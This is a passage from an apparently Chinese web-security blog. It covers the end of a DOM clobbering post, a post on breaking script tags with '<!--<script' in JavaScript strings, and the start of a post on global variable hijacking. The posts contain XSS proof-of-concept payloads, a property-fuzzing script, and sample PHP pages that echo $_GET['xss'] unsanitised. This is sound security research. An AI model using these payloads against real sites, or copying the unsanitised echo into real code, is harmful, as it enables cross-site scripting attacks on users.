<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">a</span> <span class="attr">srcdoc</span>=<span class="string">"</span></span></span><br><span class="line"><span class="tag"><span class="string">&lt;iframe srcdoc='&lt;a id=c name=d href=cid:Clobbered&gt;test&lt;/a&gt;&lt;a id=c&gt;' name=b&gt;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>alert(a.b.c.d),<span class="number">500</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果不想通过setTimeout进行延时的话，还可以通过<code>&lt;style&gt;</code>标签或者<code>&lt;script&gt;</code>等进行网络请求造成延时，使得iframe加载完毕</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">a</span> <span class="attr">srcdoc</span>=<span class="string">"</span></span></span><br><span class="line"><span class="tag"><span class="string">    &lt;iframe srcdoc='&lt;a id=c name=d href=cid:Clobbered&gt;test&lt;/a&gt;&lt;a id=c&gt;' name=b&gt;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"//test.net"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">    alert(a.b.c.d)</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="任意属性测试"><a href="#任意属性测试" class="headerlink" title="任意属性测试"></a>任意属性测试</h4><p>上面的测试一直是针对id与name进行测试的，但是dom中还有其他很多属性，下面是对于String类型并且可读可写的属性进行fuzz：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> html = [...]<span class="comment">//HTML elements array</span></span><br><span class="line"><span class="keyword">var</span> props=[];</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;html.length;i++)&#123;</span><br><span class="line">obj = <span class="built_in">document</span>.createElement(html[i]);</span><br><span class="line"><span class="keyword">for</span>(prop <span class="keyword">in</span> obj) &#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">typeof</span> obj[prop] === <span class="string">'string'</span>) &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">DOM.innerHTML = <span class="string">'&lt;'</span>+html[i]+<span class="string">' id=x '</span>+prop+<span class="string">'=1&gt;'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">document</span>.getElementById(<span class="string">'x'</span>)[prop] == <span class="number">1</span>) &#123;</span><br><span class="line">props.push(html[i]+<span class="string">':'</span>+prop);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">catch</span>(e)&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log([...new <span class="built_in">Set</span>(props)].join(<span class="string">'\n'</span>));</span><br></pre></td></tr></table></figure>

<p>可以得到两个有趣的可利用属性 为username和password,但是这两个并非HTML属性，利用如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">href</span>=<span class="string">"http://Clobbered-username:Clobbered-Password@a"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">href</span>=<span class="string">"ftp://Clobbered-username:Clobbered-Password@a"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(x.username)<span class="comment">//Clobbered-username</span></span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(x.password)<span class="comment">//Clobbered-password</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p>[<a href="http://wonderkun.cc/2020/02/15/DOM%20Clobbering%20Attack%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/]" target="_blank" rel="noopener">http://wonderkun.cc/2020/02/15/DOM%20Clobbering%20Attack%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/]</a>(<a href="http://wonderkun.cc/2020/02/15/DOM" target="_blank" rel="noopener">http://wonderkun.cc/2020/02/15/DOM</a> Clobbering Attack学习记录/)</p>
<p><a href="https://portswigger.net/research/dom-clobbering-strikes-back" target="_blank" rel="noopener">https://portswigger.net/research/dom-clobbering-strikes-back</a></p>
<p><a href="https://xz.aliyun.com/t/7329" target="_blank" rel="noopener">https://xz.aliyun.com/t/7329</a></p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2020/04/15/DOM-Clobbering-Attack/" data-id="ckabsu381000ykkvra42d0coi" class="article-share-link" data-share="baidu" data-title="DOM Clobbering Attack">Share</a>
      

      
        <a href="http://yoursite.com/2020/04/15/DOM-Clobbering-Attack/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Javascript中变量声明带来的Tags-Broken" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/04/09/Javascript%E4%B8%AD%E5%8F%98%E9%87%8F%E5%A3%B0%E6%98%8E%E5%B8%A6%E6%9D%A5%E7%9A%84Tags-Broken/" class="article-date">
  <time datetime="2020-04-09T08:16:05.000Z" itemprop="datePublished">2020-04-09</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/04/09/Javascript%E4%B8%AD%E5%8F%98%E9%87%8F%E5%A3%B0%E6%98%8E%E5%B8%A6%E6%9D%A5%E7%9A%84Tags-Broken/">Javascript中变量声明带来的Tags Broken</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="问题产生"><a href="#问题产生" class="headerlink" title="问题产生"></a>问题产生</h3><p><img src="https://s1.ax1x.com/2020/04/08/GW8xXt.png" alt="GW8xXt.png"></p>
<p>上文给出的例子如下</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> example = <span class="string">'Consider this string: &lt;!-- &lt;script&gt;'</span>;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(example);</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">/</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>看一下会造成的影响</p>
<p><img src="https://s1.ax1x.com/2020/04/08/GWGI3j.png" alt="GWGI3j.png"></p>
<p>很明显可见的是img标签以及下面的html全部被吃掉了</p>
<h3 id="原因探讨以及不同场景下的fuzz"><a href="#原因探讨以及不同场景下的fuzz" class="headerlink" title="原因探讨以及不同场景下的fuzz"></a>原因探讨以及不同场景下的fuzz</h3><h4 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h4><p>官方文档给出的解释如下：</p>
<blockquote>
<p>由于遗留原因，HTML元素中的“ <code>&lt;!--</code>”和“ <code>&lt;script</code>”字符串<code>script</code>需要进行平衡，以便解析器考虑关闭该块</p>
</blockquote>
<p>也就是说在<code>&lt;!--</code>的作用下<code>&lt;script&gt;</code>是要去和下面的<code>&lt;/script&gt;</code>闭合的，而<code>&lt;!--</code>的作用仍然是充当注释符作用，虽然<code>&lt;script&gt;</code>和<code>&lt;/script&gt;</code>进行了闭合，但是因为注释符的原因，里面的内容并不会被解析</p>
<h4 id="注释状态下的其他语句解析"><a href="#注释状态下的其他语句解析" class="headerlink" title="注释状态下的其他语句解析"></a>注释状态下的其他语句解析</h4><p>通过测试发现这种注释语句还会带来标签内语句无法解析的效果</p>
<p>测试代码如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> a=alert(<span class="number">1</span>);</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> example = <span class="string">'Consider this string: &lt;!-- &lt;script&gt;'</span>;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(example);</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">/</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>虽然最后alert(1)也在script标签内 ，但是无法执行</p>
<p><img src="https://s1.ax1x.com/2020/04/09/G4XMqK.png" alt="G4XMqK.png"></p>
<h4 id="不同场景下的fuzz"><a href="#不同场景下的fuzz" class="headerlink" title="不同场景下的fuzz"></a>不同场景下的fuzz</h4><h5 id="标签的fuzz"><a href="#标签的fuzz" class="headerlink" title="标签的fuzz"></a>标签的fuzz</h5><p>这里主要是不同标签能否产生类似script这样的闭合进行的fuzz，结果发现，似乎只有具备script这样特性的标签才可以产生这样的效果。</p>
<p>并且必须要&lt;!–与<code>&lt;script&gt;</code>进行结合搭配才可以产生这样的效果，在只有&lt;!–和<code>&lt;script&gt;</code>的情况下都无法产生预期的结果</p>
<p>这里对为什么必须要二者结合在一起才能产生这样的效果进行了一个猜想：</p>
<p>在如下代码情况下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> example = <span class="string">'Consider this string: &lt;!--'</span>;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(example);</span></span><br><span class="line"><span class="actionscript">       <span class="comment">// alert(1);</span></span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">/</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>&lt;!--</code>并未起到注释的效果可能是因为被变量的字符串作用域所限制，使得他只能是一个普通的字符串，而在如下的代码情况下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> example = <span class="string">'Consider this string: &lt;!--&lt;script&gt;'</span>;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(example);</span></span><br><span class="line"><span class="actionscript">       <span class="comment">// alert(1);</span></span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">/</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>由于<code>&lt;script&gt;</code>和<code>&lt;/script&gt;</code>的闭合导致后面的单引号失去了原本的作用，而&lt;!–也发挥了他本身的作用，所以最终导致的后果就是，红框里的内容全部当作了注释</p>
<p><img src="https://s1.ax1x.com/2020/04/08/GWWXCQ.png" alt="GWWXCQ.png"></p>
<p>需要注意的是：在这种情况下<code>&lt;script&gt;</code>里面的代码是完全无效的</p>
<p>探讨：</p>
<p>在测试完标签后发现了同样比较有趣的一点是如果我们直接在变量中声明<code>&lt;/script&gt;</code>，测试代码与效果如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> example = <span class="string">'Consider this string: </span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>';</span><br><span class="line">        console.log(example);</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">/</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s1.ax1x.com/2020/04/08/GW4KhD.png" alt="GW4KhD.png"></p>
<p>可以发现如果在变量中直接声明<code>&lt;/script&gt;</code>的话会直接和前面的<code>&lt;script&gt;</code>进了闭合，把单引号以及之后的内容都扔到了后面，产生了直接使后面代码无效化的影响</p>
<h4 id="字符串场景下的利用"><a href="#字符串场景下的利用" class="headerlink" title="字符串场景下的利用"></a>字符串场景下的利用</h4><p>漏洞利用场景如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="handlebars"><span class="xml">    var payload='<span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_GET[<span class="string">'xss'</span>]; <span class="meta">?&gt;</span></span>';</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="actionscript">        location=<span class="string">"http://www.google.com"</span>;</span></span><br><span class="line">        </span><br><span class="line">    &#125;, 1000);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>对于这个页面的效果是在1000ms后自动跳转到谷歌，不过我们可以变量的设置来bypass这个跳转</p>
<p>实现如下：<br><img src="https://s1.ax1x.com/2020/04/08/Gf3bcR.png" alt="Gf3bcR.png"></p>
<h4 id="非字符串场景下的利用"><a href="#非字符串场景下的利用" class="headerlink" title="非字符串场景下的利用"></a>非字符串场景下的利用</h4><h5 id="非字符串下变量声明中-lt-–产生的问题"><a href="#非字符串下变量声明中-lt-–产生的问题" class="headerlink" title="非字符串下变量声明中&lt;!–产生的问题"></a>非字符串下变量声明中&lt;!–产生的问题</h5><p>如果对一个变量直接用如下方式赋值（在控制台）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var a&#x3D;&lt;!--</span><br></pre></td></tr></table></figure>

<p>将一直处于输入状态</p>
<p>对于这个情况，可以前面一些字符或者数字进行避免</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var a&#x3D;1&lt;!--</span><br></pre></td></tr></table></figure>

<p>最终a的值为1</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> a=<span class="number">1</span>&lt;!--;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> b=<span class="number">2</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(a)</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">/</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>以上js可正常执行</p>
<h5 id="应用场景探讨"><a href="#应用场景探讨" class="headerlink" title="应用场景探讨"></a>应用场景探讨</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="handlebars"><span class="xml">    var payload=<span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_GET[<span class="string">'xss'</span>]; <span class="meta">?&gt;</span></span>;</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="actionscript">        location=<span class="string">"http://www.baidu.com"</span></span></span><br><span class="line">        </span><br><span class="line">    &#125;, 1000);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>利用方式其实差不多</p>
<ul>
<li>在没有分号的情况的下可以用：<code>xss=&lt;!--&lt;script或者&lt;!--&lt;script&gt;</code></li>
<li>在有分号限制的情况下只有：<code>xss=&lt;!--&lt;script&gt;</code></li>
</ul>
<h5 id="进一步探讨"><a href="#进一步探讨" class="headerlink" title="进一步探讨"></a>进一步探讨</h5><p>在另一种结构下: 如：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">setTimeout(<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">try</span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> location = <span class="string">'http://127.0.0.1'</span>;</span></span><br><span class="line"><span class="handlebars"><span class="xml">        test=<span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_GET[<span class="string">'xss'</span>]; <span class="meta">?&gt;</span></span>;</span></span></span><br><span class="line"><span class="actionscript">    &#125;<span class="keyword">catch</span>(err)&#123;</span></span><br><span class="line"><span class="handlebars"><span class="xml">        return location = '/?a='+<span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_GET[<span class="string">'xss'</span>]; <span class="meta">?&gt;</span></span>;</span></span></span><br><span class="line">    &#125;</span><br><span class="line">    &#125;,1000);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="comment">//normal part</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们需要做的是不影响下面的正常js语句且能做到xss</p>
<p>而且特别需要注意的是在try中的代码时return location而非location，区别是</p>
<ul>
<li><p>return条件下：return完了之后的语句并不会执行</p>
</li>
<li><p>非return条件下：test和location都会被赋值操作</p>
</li>
</ul>
<p>也就是说非return条件下其实是无难度的xss。</p>
<p>这里我们采用的是<code>&lt;!--&lt;script</code>去闭合而非<code>&lt;!--&lt;script&gt;</code>，后者产生的注释直接会将后面的所有全部注释掉，无法再满足正常的js结构，并且此注释状态不可取消掉。</p>
<p>前者只会把script标签内的部分注释掉（因为没有闭合），并且可以通过特定语句来取消掉注释状态，所以我们现在可以传参<code>a=alert(1);&lt;!--script</code>，这样会符合正常的语句，但会直接location掉，所以我们再重新声明下location，再给一个报错就可以了</p>
<p>最终payload</p>
<p><img src="https://i.loli.net/2020/04/09/wj7HbMp8i4GDL9s.png" alt="TIM截图20200409160838.png"></p>
<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>文章内容还是有些地方不太成熟.见谅…</p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2020/04/09/Javascript%E4%B8%AD%E5%8F%98%E9%87%8F%E5%A3%B0%E6%98%8E%E5%B8%A6%E6%9D%A5%E7%9A%84Tags-Broken/" data-id="ckabsu388001akkvr4b7gh3vs" class="article-share-link" data-share="baidu" data-title="Javascript中变量声明带来的Tags Broken">Share</a>
      

      
        <a href="http://yoursite.com/2020/04/09/Javascript%E4%B8%AD%E5%8F%98%E9%87%8F%E5%A3%B0%E6%98%8E%E5%B8%A6%E6%9D%A5%E7%9A%84Tags-Broken/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-前端全局变量劫持" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/04/06/%E5%89%8D%E7%AB%AF%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%8A%AB%E6%8C%81/" class="article-date">
  <time datetime="2020-04-06T12:13:46.000Z" itemprop="datePublished">2020-04-06</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/04/06/%E5%89%8D%E7%AB%AF%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%8A%AB%E6%8C%81/">前端全局变量劫持</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>忙完了一些杂事，学一些新的东西吧（虽说心情有点难受</p>
<h3 id="iframe之间的访问与同源关系"><a href="#iframe之间的访问与同源关系" class="headerlink" title="iframe之间的访问与同源关系"></a>iframe之间的访问与同源关系</h3><h4 id="父页面访问子页面"><a href="#父页面访问子页面" class="headerlink" title="父页面访问子页面"></a>父页面访问子页面</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"id"</span>).contentWindow; <span class="comment">// 获取iframe的window对象</span></span><br><span class="line"><span class="built_in">window</span>.frames[<span class="number">0</span>]; <span class="comment">// 获取iframe的window对象</span></span><br><span class="line"><span class="built_in">window</span>[<span class="number">0</span>] ; <span class="comment">// 这个比较有意思， window 是本页面的window对象，window[0] 是子页面的window对象</span></span><br></pre></td></tr></table></figure>

<h4 id="子页面访问父页面"><a href="#子页面访问父页面" class="headerlink" title="子页面访问父页面"></a>子页面访问父页面</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.parent;  <span class="comment">//获取上一级的window对象，如果还是iframe则是该iframe的window对象</span></span><br><span class="line"><span class="built_in">window</span>.top ;   <span class="comment">// 获取最顶级容器的window对象，即，就是你打开页面的文档</span></span><br></pre></td></tr></table></figure>

<h4 id="location与frame"><a href="#location与frame" class="headerlink" title="location与frame"></a>location与frame</h4><p>如果父和子页面是同源的，那么可以通过这个window对象获取到任何你想获取的内容，包括但是不限于 document,name,location 等。但是在非同源的情况下，iframe的window对象大多数的属性都会被同源策略block掉，但是有两个属性比较特殊。</p>
<ol>
<li>frames 可读，但是不可写。 意味着可以读取不同域的子页面里面的iframe的window对象</li>
<li>location 可写，但是不可读。意味着父子可以相互修改彼此的 location</li>
</ol>
<p>上述内容摘自wonderkun师傅博客（</p>
<h4 id="iframe同源跨域问题"><a href="#iframe同源跨域问题" class="headerlink" title="iframe同源跨域问题"></a>iframe同源跨域问题</h4><p>iframe所加载的子页面会被同源限制，所以无法对引入进来的iframe中的元素进行操作：</p>
